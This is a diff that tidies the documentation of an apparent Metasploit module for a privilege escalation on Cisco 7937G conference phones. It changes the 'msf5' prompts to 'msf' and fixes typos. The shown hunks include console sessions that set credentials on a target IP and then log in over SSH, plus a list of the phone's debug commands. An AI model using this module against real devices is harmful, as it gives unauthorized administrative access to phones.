@@ -38,14 +38,14 @@ The desired username for setting SSH access
 #### Successful Scenario
 
 ```
-msf5 > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
+msf > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
 user => test
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
 pass => test
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
 rhosts => 192.168.110.209
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > run
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > run
 
 [*] Running for 192.168.110.209...
 [*] 192.168.110.209 - Attempting to set SSH credentials.
@@ -55,7 +55,7 @@ msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > run
 [*] 192.168.110.209 - ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 test@192.168.110.209
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(linux/ssh/cve_2020_16137) > exit
+msf auxiliary(linux/ssh/cve_2020_16137) > exit
 user@ubuntu:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 test@192.168.110.209
 test@192.168.110.209's password:
 
@@ -128,7 +128,7 @@ ncasCb - Show detailed ncas information, related to either call services,
 uptime - Show phone uptime.
 appPrt - Show UI's call status.
 fntPrt - Show information about fonts available on phone.
-memtop - Shows the top poiter to current memory.
+memtop - Shows the top pointer to current memory.
 removeScheduledLogEntry - debug
 addScheduledLogEntry - debug
 fatalError - Simulate fatal error for the phone.
@@ -178,8 +178,8 @@ localePrintAll - localePrintAll
 ceShow - Show Client Engine Status
 
 Commands 101 to 121:
-udiShow - Show Unique Device Indentifier
-show - Show Unique Device Indentifier
+udiShow - Show Unique Device Identifier
+show - Show Unique Device Identifier
 pbnShow - Display app & bootrom headers
 upr - Upgrade to a Rockpile Standalone Image
 upm - Upgrade to a Rockpile Manf Image
@@ -225,14 +225,14 @@ $>exit
 
 #### Unsuccessful Scenario
 ```
-msf5 > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
+msf > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
 user => test
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
 pass => test
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
 rhosts => 192.168.110.209
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > run
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > run
 
 [*] Running for 192.168.110.209...
 [*] 192.168.110.209 - Attempting to set SSH credentials.
@@ -246,14 +246,14 @@ msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > run
 #### Successful Scenario
 
 ```
-msf5 > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
+msf > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
 user => test
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
 pass => test
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
 rhosts => 192.168.110.209
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > run
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > run
 
 [*] Running for 192.168.110.209...
 [*] 192.168.110.209 - Attempting to set SSH credentials.
@@ -263,7 +263,7 @@ msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > run
 [*] 192.168.110.209 - ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 test@192.168.110.209
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(linux/ssh/cve_2020_16137) > exit
+msf auxiliary(linux/ssh/cve_2020_16137) > exit
 user@ubuntu:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 test@192.168.110.209
 test@192.168.110.209's password:
 
@@ -336,7 +336,7 @@ ncasCb - Show detailed ncas information, related to either call services,
 uptime - Show phone uptime.
 appPrt - Show UI's call status.
 fntPrt - Show information about fonts available on phone.
-memtop - Shows the top poiter to current memory.
+memtop - Shows the top pointer to current memory.
 removeScheduledLogEntry - debug
 addScheduledLogEntry - debug
 fatalError - Simulate fatal error for the phone.
@@ -386,8 +386,8 @@ localePrintAll - localePrintAll
 ceShow - Show Client Engine Status
 
 Commands 101 to 121:
-udiShow - Show Unique Device Indentifier
-show - Show Unique Device Indentifier
+udiShow - Show Unique Device Identifier
+show - Show Unique Device Identifier
 pbnShow - Display app & bootrom headers
 upr - Upgrade to a Rockpile Standalone Image
 upm - Upgrade to a Rockpile Manf Image
@@ -433,14 +433,14 @@ $>exit
 
 #### Unsuccessful Scenario
 ```
-msf5 > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
+msf > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
 user => test
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
 pass => test
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
 rhosts => 192.168.110.209
-msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > run
+msf auxiliary(admin/http/cisco_7937g_ssh_privesc) > run
 
 [*] Running for 192.168.110.209...
 [*] 192.168.110.209 - Attempting to set SSH credentials.
